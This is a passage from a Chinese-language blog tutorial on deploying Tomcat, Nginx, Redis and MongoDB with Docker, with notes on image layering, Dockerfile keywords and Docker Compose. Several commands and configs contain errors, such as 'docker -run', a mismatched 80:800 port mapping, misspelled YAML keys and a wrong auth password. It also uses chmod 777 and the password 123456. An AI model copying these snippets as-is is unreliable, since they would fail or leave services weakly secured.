shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -id --name=c_tomcat \<br>-p 8080:8080 \<br>-v $PWD:/usr/local/tomcat/webapps \<br>tomcat<br></code></pre></td></tr></table></figure><ul><li>参数说明：<ul><li><code>-p 8080:8080</code>：将容器的8080端口映射到主机的8080端口</li><li><code>-v $PWD:/usr/local/tomcat/webapps</code>：将主机中当前目录挂载到容器的<code>webapps</code></li></ul></li></ul></li><li><p>最后使用外部机器访问tomcat</p></li></ol><h3 id="4-3-Nginx部署"><a href="#4-3-Nginx部署" class="headerlink" title="4.3 Nginx部署"></a>4.3 Nginx部署</h3><ol><li><p>搜索Nginx 镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search nginx<br></code></pre></td></tr></table></figure></li><li><p>拉取mysql镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull nginx<br></code></pre></td></tr></table></figure></li><li><p>创建容器，设置端口映射、目录映射</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">在/root目录下创建nginx目录用于存储nginx数据信息</span><br>mkdir ~/nginx<br>cd ~/nginx<br>mkdir conf<br>cd conf<br><span class="hljs-meta prompt_">#</span><span class="language-bash">在~/nginx/conf/下创建nginx.conf文件，粘贴下面代码块的内容</span><br>vim nginx.conf<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shel">user  nginx;<br>worker_processes  1;<br><br>error_log  /var/log/nginx/error.log warn;<br>pid        /var/run/nginx.pid;<br><br>events &#123;<br>    worker_connections  1024;<br>&#125;<br><br>http &#123;<br>    include       /etc/nginx/mime.types;<br>    default_type  application/octet-stream;<br><br>    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;<br>                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;<br>                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;<br><br>    access_log  /var/log/nginx/access.log  main;<br><br>    sendfile        on;<br>    #tcp_nopush     on;<br><br>    keepalive_timeout  65;<br><br>    #gzip  on;<br><br>    include /etc/nginx/conf.d/*.conf;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker -run -id --name=c_nginx \<br>-p 80:800 \<br>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf \<br>-v $PWD/logs:/var/log/nginx \<br>-v $PWD/html:/usr/share/nginx/html \<br>nginx<br></code></pre></td></tr></table></figure><ul><li>参数说明：<ul><li><code>-p 80:800</code>：将容器的80端口映射到宿主机的80端口</li><li><code>-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf</code>：将主机当前目录下的<code>/conf/nginx.conf</code>挂载到容器的<code>:/etc/nginx/nginx.conf</code>配置目录</li><li><code>-v $PWD/html:/usr/share/nginx/html</code>：将主机当前目录挂载到容器的<code>/val/log/nginx</code>日志目录</li></ul></li></ul></li><li><p>使用外部机器访问nginx</p></li></ol><h3 id="4-4-Redis部署"><a href="#4-4-Redis部署" class="headerlink" title="4.4 Redis部署"></a>4.4 Redis部署</h3><ol><li><p>搜索Redis 镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search redis<br></code></pre></td></tr></table></figure></li><li><p>拉取Redis 镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull redis:5.0<br></code></pre></td></tr></table></figure></li><li><p>创建容器，设置端口映射、目录映射</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建 redis 配置存放目录</span><br>mkdir -p redis_kinit/conf &amp;&amp; chmod 777 redis_kinit/conf<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建 redis 数据存放目录</span><br>mkdir -p redis_kinit/data &amp;&amp; chmod 777 redis_kinit/data<br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动</span><br>docker run -id --name=c_redis -p 6379:6379 redis:5.0<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">要先去官网下载对应的配置文件 https://raw.githubusercontent.com/redis/redis/7.0/redis.conf</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">自定义启动 redis</span><br>docker run -d -p 6379:6379 \<br>--name redis_kinit \<br>--restart=always \<br>-v $PWD/redis_kinit/data:/data \<br>-v $PWD/redis_kinit/conf/redis.conf:/etc/redis/redis.conf \<br>redis:7.0.4 \<br>redis-server /etc/redis/redis.conf \<br>--appendonly yes \<br>--requirepass 123456<br><br><br>docker run -itd -p 6378:6379 \<br>--name redis_kinit2 \<br>--restart=always \<br>-v $PWD/data:/data \<br>-v $PWD/conf/redis.conf:/etc/redis/redis.conf \<br>redis:7.0.4 \<br><br></code></pre></td></tr></table></figure></li><li><p>使用外部机器连接redis</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">redis-cli.exe -h 192.168.187.129 -p 6379<br><span class="hljs-meta prompt_"># </span><span class="language-bash">验证一下是否部署成功</span><br>docker exec -it &lt;容器名称或ID&gt; redis-cli<br>docker exec -it 73f59ae7be56 redis-cli<br>然后如果提示(error) NOAUTH Authentication required.<br>就AUTH验证你的密码，再试试<br><span class="hljs-meta prompt_"># </span><span class="language-bash">输入ping</span> <br><span class="hljs-meta prompt_"># </span><span class="language-bash">看会不会返回 pong</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="4-5-mongo部署"><a href="#4-5-mongo部署" class="headerlink" title="4.5 mongo部署"></a>4.5 mongo部署</h3><ol><li><p>搜索Redis 镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker search mongo<br></code></pre></td></tr></table></figure></li><li><p>拉取Redis 镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull mongo<br></code></pre></td></tr></table></figure></li><li><p>创建容器，设置端口映射、目录映射</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建 mongo 数据存放目录</span><br>mkdir -p /mongo_kinit/data &amp;&amp; chmod 777 /mongo_kinit/data<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">启动</span><br>docker run \<br>--name kinit_mongo \<br>-p 27017:27017  \<br>-v $PWD/data:/data/db \<br>-d mongo \<br>--auth<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">进入</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -it mongo mongosh admin</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建一个名为 admin，密码为 123456 的用户。</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"> db.createUser(&#123; user:<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-built_in">pwd</span>:<span class="hljs-string">&#x27;123456&#x27;</span>,roles:[ &#123; role:<span class="hljs-string">&#x27;userAdminAnyDatabase&#x27;</span>, db: <span class="hljs-string">&#x27;admin&#x27;</span>&#125;,<span class="hljs-string">&quot;readWriteAnyDatabase&quot;</span>]&#125;);</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">尝试使用上面创建的用户信息进行连接。</span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">db.auth(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;123456&#x27;</span>)</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建</span><br>use kinit # 创建数据库<br>db.createUser(&#123; user: &#x27;admin&#x27;, pwd: &#x27;123456&#x27;, roles: [ &#123; role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; &#125; ] &#125;);<br>db.auth(&#x27;admin&#x27;, &#x27;011023&#x27;) # 尝试使用上面创建的用户信息进行连接。<br>exit # 创建成功后可退出<br><br>db.createUser(&#123; user: &#x27;kinit&#x27;, pwd: &#x27;123456&#x27;, roles: [ &#123; role: &quot;readWrite&quot;, db: &quot;kinit&quot; &#125; ] &#125;)<br>db.auth(&quot;kinit&quot;,&quot;123456&quot;) # 验证是否创建成功<br>exit<br>mongodb://admin:123456@127.0.0.1:27017<br><br></code></pre></td></tr></table></figure></li><li></li></ol><h1 id="五、docker-file（后续有空补充）"><a href="#五、docker-file（后续有空补充）" class="headerlink" title="五、docker file（后续有空补充）"></a>五、docker file（后续有空补充）</h1><h3 id="5-1-Docker-镜像原理"><a href="#5-1-Docker-镜像原理" class="headerlink" title="5.1 Docker 镜像原理"></a>5.1 Docker 镜像原理</h3><p>​    思考：</p><ul><li>Docker 镜像的本质是什么？<ul><li>是一个<strong>分层</strong>的文件系统</li></ul></li><li>Docker 中一个CentOS 镜像为什么只有200MB，而一个CentOS 操作系统的iso 文件要几个G？<ul><li>CentOS的iso镜像文件包含bootfs和rootfs，而Docker的CentOS镜像复用操作系统的bootfs，只有rootfs和其他镜像层</li></ul></li><li>Docker 中一个Tomcat 镜像为什么有500MB，而一个Tomcat 安装包只有70多MB？<ul><li>由于Docker中镜像是分层的，tomcat虽然只有70多MB，但他需要依赖于<strong>父镜像和基础镜像</strong>，所以整个对外暴露的tomcat镜像大小500多MB</li></ul></li></ul><p><strong>操作系统组成部分</strong>：</p><ul><li><strong>进程调度</strong>子系统</li><li><strong>进程通信</strong>子系统</li><li><strong>内存管理</strong>子系统</li><li><strong>设备管理</strong>子系统</li><li><strong>文件管理</strong>子系统</li><li><strong>网络通信</strong>子系统</li><li><strong>作业控制</strong>子系统</li></ul><p>Linux文件系统由bootfs 和rootfs 两部分组成</p><ul><li>bootfs：包含bootloader（引导加载程序）和kernel（内核）</li><li>rootfs：root文件系统，包含的就是典型的Linux 系统中的&#x2F;dev、&#x2F;proc、&#x2F;bin等标准目录和文件</li><li>不同的Linux 发行版，bootfs 基本一样，而rootfs 不同，如ubuntu，CentOS等</li></ul><p><strong>Docker 镜像原理：</strong></p><ul><li>Docker 镜像是由特殊的文件系统叠加而成</li><li>最低端是bootfs，并使用宿主机的bootfs</li><li>第二层是root 文件系统rootfs ，称为base iamge</li><li>然后再往上可以叠加其他的镜像文件</li><li>统一文件系统（Union File System）技术能够将不同的层整合成一个文件系统，为这些层提供了一个统一的视角，这样就隐藏了多层的存在，在用户的角度看来，只存在一个文件系统</li><li>一个镜像可以放在另一个镜像的上面。位于下面的镜像称为父镜像，最底部的镜像称为基础镜像</li><li>当从一个镜像启动容器时，Docker会在最顶层加载一个读写文件系统作为容器</li></ul><p><strong>镜像制作：</strong></p><ul><li><p>容器转为镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker commit  容器id 镜像名称:版本号<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shel">docker save -o 压缩文件名称 镜像名称:版本号<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker load -i 压缩文件名称<br></code></pre></td></tr></table></figure></li></ul><h3 id="5-2-Dockerfile-概念及作用"><a href="#5-2-Dockerfile-概念及作用" class="headerlink" title="5.2 Dockerfile 概念及作用"></a>5.2 Dockerfile 概念及作用</h3><p><strong>Dockerfile 概念</strong></p><ul><li>Dockerfile 是一个文本文件</li><li>包含了一条条的指令</li><li>每一条指令构建一层，<strong>基于基础镜像，最终构建出一个新的镜像</strong></li><li>对于开发人员，可以<strong>为开发团队提供一个完全一致的开发环境</strong></li><li>对于测试人员，可以<strong>直接拿开发时所构建的镜像或者通过Dockerfile 文件构建一个新的镜像</strong>开始工作了</li><li>对于运维人员，在部署时，<strong>可以实现应用的无缝移植</strong></li></ul><h3 id="5-3-Dockerfile-关键字"><a href="#5-3-Dockerfile-关键字" class="headerlink" title="5.3 Dockerfile 关键字"></a>5.3 Dockerfile 关键字</h3><table><thead><tr><th>关键字</th><th>作用</th><th align="left">备注</th></tr></thead><tbody><tr><td>FROM</td><td>指定父镜像</td><td align="left">指定dockerfile基于哪个images构建</td></tr><tr><td>MAINTAINER</td><td>作者信息</td><td align="left">用来标明这个dockerfile 谁写的</td></tr><tr><td>LABEL</td><td>标签</td><td align="left">用来指明dockerfile 的标签，可以使用Label代替Maintainer 最终都是在docker image基本信息中嗯可以查看</td></tr><tr><td>RUN</td><td>执行命令</td><td align="left">执行一段命令 默认是<code>/bin/sh</code> 格式：<code>RUN command</code> 或者 <code>RUN [&quot;command&quot;,&quot;param1&quot;,&quot;param2&quot;]</code></td></tr><tr><td>CMD</td><td>容器启动命令</td><td align="left">提供启动容器时候的默认命令和ENTRYPOINT配合使用。格式：<code>CMD command param1 param2</code>或者<code>CMD [&quot;command&quot;,&quot;param1&quot;,&quot;param2&quot;]</code></td></tr><tr><td>ENTRYPOINT</td><td>入口</td><td align="left">一般在制作一些执行就关闭的容器中会使用</td></tr><tr><td>COPY</td><td>复制文件</td><td align="left">build 的时候复制文件到image中</td></tr><tr><td>ADD</td><td>添加文件</td><td align="left">build 的时候添加文件到iamge 中，不仅仅局限于当前build 上下文 可以来源于远程服务</td></tr><tr><td>ENV</td><td>环境变量</td><td align="left">指定build 时候的环境变量 可以在启动容器的时候 通过<code>-e</code>覆盖  格式：<code>ENV name = value</code></td></tr><tr><td>ARG</td><td>构建参数</td><td align="left">构建参数 只在构建的时候使用参时 如果有ENV 那么ENV 的相同名字的值始终覆盖ARG 的值</td></tr><tr><td>VOLUME</td><td>定义外部可以挂载的数据卷</td><td align="left">指定build 的image 那些目录可以启动的时候挂载到文件系统中 启动容器的时候使用<code>-v</code>绑定 格式：<code>VOLUME [&quot;目录&quot;]</code></td></tr><tr><td>EXPOSE</td><td>暴露端口</td><td align="left">定义容器运行的时候监听的端口 启动容器的使用<code>-p</code>来绑定暴露端口 格式：<code>EXPOSE 8080</code>或者<code>EXPOSE 8080/udp</code></td></tr><tr><td>WORKDIR</td><td>工作目录</td><td align="left">指定容器内部的工作目录 如果没有创建则自动创建 如果指定&#x2F;使用是绝对地址 如果不是&#x2F;开头那么实在上一条workdir 的路径的相对路径</td></tr><tr><td>USER</td><td>指定执行用户</td><td align="left">指定build 或者启动的时候 用户 在RUN CMD ENTRYPOINT执行的时候的用户</td></tr><tr><td>HEALTHCHECK</td><td>健康检查</td><td align="left">指定监测当前容器的健康测试的命令 基本上没有 因为很多时候 应用本身由健康监测机制</td></tr><tr><td>ONBUILD</td><td>触发器</td><td align="left">当存在ONBUILD 关键字的镜像作为基础镜像的时候 当执行FROM 完成之后 会执行ONBUILD的命令 但是不影响当前镜像 用处也不怎么大</td></tr><tr><td>STOPSIGNAL</td><td>发送信息量到宿主机</td><td align="left">该STOPSIGNAL指令设置将发送到容器的系统调用信号以退出</td></tr><tr><td>SHELL</td><td>指定执行脚本的shell</td><td align="left">指定RUN CMD ENTRYPOINT 执行命令的时候 使用的shell</td></tr></tbody></table><h3 id="5-4-案例"><a href="#5-4-案例" class="headerlink" title="5.4 案例"></a>5.4 案例</h3><h4 id="5-4-1-案例一"><a href="#5-4-1-案例一" class="headerlink" title="5.4.1 案例一"></a>5.4.1 案例一</h4><p>需求：</p><p>​    自定义CentOS7镜像。要求：</p><ol><li>默认登录路径为<code>/usr</code></li><li>可以使用vim</li></ol><p>实现步骤：</p><ol><li>定义父镜像：<code>FROM centos:7</code></li><li>定义作者信息：<code>MAINTAINER crisp077 &lt;www.crisp077.xyz&gt;</code></li><li>执行安装vim命令：<code>RUN yum install -y vim</code></li><li>定义默认的工作目录：<code>WORKDIR /usr</code></li><li>定义容器启动执行的命令：<code>CMD /bin/bash</code></li></ol><p>创建使用dockerfile的镜像：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker build -f ./centos_docker -t crisp_centos:1 .<br></code></pre></td></tr></table></figure><h4 id="5-4-2-案例二"><a href="#5-4-2-案例二" class="headerlink" title="5.4.2 案例二"></a>5.4.2 案例二</h4><p>需求：</p><p>​    定义dockerfile，发布springboot 项目</p><p>实现步骤：</p><ol><li>定义父镜像：<code>FROM java:8</code></li><li>定义作者信息：<code>MAINTAINER crisp077 &lt;www.crisp077.xyz&gt;</code></li><li>将jar包添加到容器：<code>ADD springboot.jar app.jar</code></li><li>定义容器启动执行的命令：<code>CMD java -jar app.jar</code></li><li>通过dockerfile 构建镜像：<code>docker build -f dockerfile文件路径 -t 镜像名称:版本</code></li></ol><h1 id="六、docker-compose-（简单介绍）"><a href="#六、docker-compose-（简单介绍）" class="headerlink" title="六、docker compose （简单介绍）"></a>六、docker compose （简单介绍）</h1><h2 id="6-1-服务编排的概念"><a href="#6-1-服务编排的概念" class="headerlink" title="6.1 服务编排的概念"></a>6.1 服务编排的概念</h2><p>​    微服务架构的应用系统中一般包含若干个微服务，每个微服务都会部署多个实例，如果每个微服务都要手动启动，维护工作量会很大</p><ul><li>要从Dockerfile build image 或者去 dockerhub 拉取image</li><li>要创建多个container</li><li>要管理这些container（启动停止删除）</li></ul><p><strong>服务编排：</strong></p><p>​    按照一定的业务规则批量管理容器</p><h2 id="6-2-Dockers-Compose-概述"><a href="#6-2-Dockers-Compose-概述" class="headerlink" title="6.2 Dockers Compose 概述"></a>6.2 Dockers Compose 概述</h2><p>​    Docker Compose 是一个编排多容器分布式部署的工具，提供命令集管理器化应用的完整开发期，包括服务构建，启动和停止。使用步骤：</p><ol><li>利用 Dockerfile 定义运行环境镜像</li><li>使用 docker-compose.yml 定义组成应用的各服务</li><li>运行 docker-compose up 启动应用</li></ol><h5 id="6-2-1-安装Docker-Compose"><a href="#6-2-1-安装Docker-Compose" class="headerlink" title="6.2.1 安装Docker Compose"></a>6.2.1 安装Docker Compose</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">Compose 目前已经完全支持Linux、MAC OS、Windows，在安装Compose之前，需要先安装Docker。下面以编译好的二进制包方式安装在Linux中</span><br>curl -L &quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose<br><span class="hljs-meta prompt_">#</span><span class="language-bash">设置文件可执行权限</span><br>chmod +x /usr/local/bin/docker-compose<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看版本信息</span><br>docker-compose -version<br></code></pre></td></tr></table></figure><h5 id="6-2-2-卸载Docker-Compose"><a href="#6-2-2-卸载Docker-Compose" class="headerlink" title="6.2.2 卸载Docker Compose"></a>6.2.2 卸载Docker Compose</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">二进制包方式安装的，删除二进制文件即可</span><br>rm /usr/local/bin/docker-compose<br></code></pre></td></tr></table></figure><h2 id="6-3-案例"><a href="#6-3-案例" class="headerlink" title="6.3 案例"></a>6.3 案例</h2><p><strong>使用docker compose编排nginx+springboot项目</strong></p><ol><li><p>创建docker-compose目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir ~/docker-compose<br>cd ~/docker-compose<br></code></pre></td></tr></table></figure></li><li><p>编写<code>docker-compose.yml</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">version: &#x27;3&#x27;<br>services:<br>  nginx:<br>   iamge: nginx<br>   ports:<br>    - 80:80<br>   links:<br>    - app<br>   volumes:<br>       - ./nginx/conf.d:/etc/nginx/conf.d<br>   app:<br>     image: app<br>     expose:<br>       - &quot;8080&quot;<br></code></pre></td></tr></table></figure></li><li><p>创建<code>./nginx/conf.d</code>目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir -p ./nginx/conf.d<br></code></pre></td></tr></table></figure></li><li><p>在<code>./nginx/conf.d</code>目录下编写<code>crisp.conf</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">server &#123;<br>    listen 80;<br>    acess_log off;<br><br>    location / &#123;<br>        proxy_pass https://app:8080;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在<code>~/docker-compose</code>目录下 使用dockers-compose 启动容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose up<br></code></pre></td></tr></table></figure></li><li><p>测试访问</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">http://192.168.187.129/hello<br></code></pre></td></tr></table></figure></li></ol><h2 id="6-4-docker-compose介绍【新】"><a href="#6-4-docker-compose介绍【新】" class="headerlink" title="6.4 docker compose介绍【新】"></a>6.4 docker compose介绍【新】</h2><p>docker compose 最开始是一个插件，后来官方采纳了这个开发者开发的开源插件</p><ol><li>用于定义和运行多容器docker 应用程序的工具，它使用YAML文件来配置应用程序的服务、网络和数据卷等组件，并通过一些简单的命令提供一种统一的方式来管理和操作这些容器</li><li>多容器应用：Docker Compose适用于构建和管理多容器的应用程序。你可以在同一个Compose文件中定义和管理应用程序中的多个服务，这些服务可以相互通信和协作。</li><li>声明式配置：通过使用YAML文件来定义Compose配置，你可以以声明式的方式描述应用程序的结构和配置。这使得配置易于阅读、理解和维护，并且可以轻松地重现整个应用程序环境。</li><li>简化的部署和管理：使用Docker Compose，你可以使用一条简单的命令来启动、停止、重启和删除整个应用程序。这使得应用程序的部署和管理变得更加简单和一致。</li><li>网络和卷配置：Docker Compose允许你定义应用程序中的网络和卷配置。你可以创建自定义网络，使得Compose中的服务可以相互通信。你还可以定义卷挂载，用于持久化数据或在容器之间共享文件。</li><li>扩展和覆盖：Compose配置支持扩展和覆盖，这意味着你可以在不同的环境中使用相同的Compose文件，只需根据需要覆盖某些配置。这使得在开发、测试和生产环境之间切换变得更加容易。</li></ol><p>服务定义：使用Docker Compose，你可以定义应用程序中的各个服务。每个服务都可以由一个或多个容器组成，可以设置容器的映像、端口映射、环境变量、卷挂载等配置</p><blockquote><p> 简单说就是：将你的某个应用程序所需要的服务，都编排到一个队列上去，通过docker compose来同一管理，这个时候你的这个compose内的容器都会处于同一个bridge桥网络下，</p><p>提供了一种简单且一致的方式来组织和操作容器化的应用程序，并使得在不同环境钟部署和运行应用程序变得更加容易</p></blockquote><h3 id="6-1-1-docker-compose-相关命令"><a href="#6-1-1-docker-compose-相关命令" class="headerlink" title="6.1.1 docker compose 相关命令"></a>6.1.1 docker compose 相关命令</h3><p>构建镜像：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose build<br>```<br>这个命令将根据Compose文件中定义的服务构建镜像。如果镜像已经存在，它将跳过构建步骤。<br></code></pre></td></tr></table></figure><p>启动容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose up<br>```<br>这个命令将使用Compose文件启动定义的服务。如果Compose文件不存在，它将自动构建镜像并启动容器。<br></code></pre></td></tr></table></figure><p>启动容器（后台模式）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose up -d<br>```<br>这个命令将以后台模式启动容器，并将输出重定向到终端。<br></code></pre></td></tr></table></figure><p>查看Compose服务状态：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose config<br>```<br>这个命令将验证Compose文件的语法并显示解析后的配置。<br></code></pre></td></tr></table></figure><p>停止容器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose down<br>```<br>这个命令将停止并删除Compose文件定义的所有容器、网络和卷。<br></code></pre></td></tr></table></figure><p>查看Compose文件配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose config<br>```<br>这个命令将验证Compose文件的语法并显示解析后的配置。<br></code></pre></td></tr></table></figure><p>执行Compose服务命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker-compose exec &lt;service_name&gt; &lt;command&gt;<br>```<br>这个命令将在指定的服务容器中执行给定的命令。<br></code></pre></td></tr></table></figure><p>查看Compose服务日志：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看Compose的服务日志：</span><br>docker-compose 